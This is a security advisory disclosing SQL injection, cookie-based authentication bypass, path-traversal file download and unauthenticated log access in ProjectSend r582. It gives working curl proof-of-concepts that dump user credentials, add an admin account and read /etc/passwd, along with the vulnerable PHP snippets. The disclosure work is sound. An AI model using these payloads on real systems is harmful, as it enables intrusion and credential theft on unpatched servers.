Version:  r582 and probably prior
Vendor:  www.projectsend.org
Vulnerability type:  SQL-injection, Auth bypass, Arbitrary File Access, Insecure Object Reference
Risk level:  4 / 5
Credit:  filippo.cavallarin@wearesegment.com
CVE:  N/A
Vendor notification:  2015-11-05
Vendor fix:  N/A
Public disclosure:  2016-01-29
 
 
 
 
- SQL Injection
 
The script manage-files.php suffers from a SQL-Injection vulnerability because the request parameter "status" is used to build a sql query without beeing properly sanitized. In order to exploit this issue, an attaccker must be logged into the application as a non-privileged user.
The following proof-of-concept demostrates this issue by downloading login credentials of registered users:
 
curl -X POST &#039;http://projectsend.local/manage-files.php?client_id=1&#039; -H &#039;Cookie: PHPSESSID=hiefdo3ra5hgmpa5mrpdfhih22&#039; --data "status=10&#039; and 0 union select 0,1 ,&#039;0) or 1 union select 0,1,concat(user,char(32),password),3,4,5,6,7,8,9 from tbl_users -- a&#039;,3,4,5,6,&#039;7"
 
 
 
- SQL Injection
 
The script manage-files.php suffers from a SQL-Injection vulnerability because the request parameter "files" is used to build a sql query without beeing properly sanitized. In order to exploit this issue, an attaccker must be logged into the application as a non-privileged user.
The following proof-of-concept demostrates this issue by injecting a SLEEP command into the database engine:
 
curl -X POST &#039;http://projectsend.local/manage-files.php&#039; --data &#039;files_actions=delete&do_action=&files%5B%5D=5) OR 1=sleep(10&#039; -H &#039;Cookie: PHPSESSID=hiefdo3ra5hgmpa5mrpdfhih22&#039;
 
 
 
- SQL Injection
 
The script clients.php suffers from a SQL-Injection vulnerability because the request parameter "selected_clients" is used to build a sql query without beeing properly sanitized. In order to exploit this issue, an attaccker must be logged into the application as a non-privileged user.
There is no POC available, but the vulnerability is easy to spot by looking at the source code at line 63.
 
    $selected_clients = $_POST[&#039;selected_clients&#039;];
    $clients_to_get = mysql_real_escape_string(implode(&#039;,&#039;,array_unique($selected_clients)));
    $sql_user = $database->query("SELECT id, name FROM tbl_users WHERE id IN ($clients_to_get)");
 
 
 
- SQL Injection
 
The script clients.php suffers from a SQL-Injection vulnerability because the request parameter "status" is used to build a sql query without beeing properly sanitized. In order to exploit this issue, an attaccker must be logged into the application as a non-privileged user.
There is no POC available, but the vulnerability is easy to spot by looking at the source code at line 146.
 
    $status_filter = $_POST[&#039;status&#039;];
    $cq .= " AND active=&#039;$status_filter&#039;";
    [...]
    $sql = $database->query($cq);
 
 
 
- SQL Injection
 
The script process-zip-download.php suffers from a SQL-Injection vulnerability because the request parameter "file" is used to build a sql query without beeing properly sanitized.
There is no POC available, but the vulnerability is easy to spot by looking at the source code.
 
    $files_to_zip = explode(&#039;,&#039;,substr($_GET[&#039;file&#039;], 0, -1));
    [...]
    foreach ($files_to_zip as $file_to_zip) {
    [...]
    $sql_url = $database->query(&#039;SELECT id, expires, expiry_date FROM tbl_files WHERE url="&#039; . $file_to_zip .&#039;"&#039;);
 
 
 
- SQL Injection
 
The script home-log.php suffers from a SQL-Injection vulnerability because the request parameter "action" is used to build a sql query without beeing properly sanitized.
There is no POC available, but the vulnerability is easy to spot by looking at the source code.
 
    $log_action = $_GET[&#039;action&#039;];
    $log_query = "SELECT * FROM tbl_actions_log";
    if (!empty($log_action)) {
        $log_query .= " WHERE action = &#039;$log_action&#039;";
 
 
 
- Authentication Bypass
 
An Authenticaton Bypass vulnerability has been discovered in multiple pages. By adding a cookie to request it is possible to bypass certain authentication checks and gain access to protected resources.
The following proof-of-concepts are available:
 
Lists all registered users:
curl http://projectsend.local/users.php -H &#039;Cookie: userlevel=9&#039;
 
Add an Admin user to the database:
curl http://projectsend.local/users-add.php -H &#039;Cookie: userlevel=9&#039; -X POST --data &#039;add_user_form_name=necci&add_user_form_email=poplix@papuasia.org&add_user_form_level=9&add_user_form_user=necci&add_user_form_active=1&add_user_form_pass=123456&#039;
 
Read file statsictics:
curl http://projectsend.local/home.php -H &#039;Cookie: userlevel=9&#039;
 
Read file details:
curl http://projectsend.local/edit-file.php?file_id=1 -H &#039;Cookie: userlevel=9&#039;
 
Bypass authentication:
curl  &#039;http://projectsend.local/process-zip-download.php&#039; -H &#039;Cookie: userlevel=8&#039;
 
 
- Arbitrary File Download
 
The page process-zip-download.php fails to restrict access to local files. By injecting a path traversal vector into the "file" parameter it is possible to read an arbitrary file from the server.
By combining this vulnerability with the Authentication Bypass affecting the same file, is possible for a non-authenticated user to gain access to protected data.
The followinf proof-of-concept is available.
 
curl  &#039;http://projectsend.local/process-zip-download.php?file=../../../../../../../../etc/passwdd&#039; -H &#039;Cookie: userlevel=8&#039; > ttt.zip
 
 
- Insecure Direct Object References
 
The page actions.log.export.php fails to perform authentication checks so it&#039;s possible for anyone to access logs data.
The followinf proof-of-concept is available.
 
curl http://projectsend.local/includes/actions.log.export.php
 
 
Solution
No solution is available at the time of writing.
The vendor has been contacted about three months before the public disclosure, but he stopped responding after we sent him our report.
 
 
References
https://www.wearesegment.com/research/Projectsend_multiple_vulnerabilities
http://www.projectsend.org

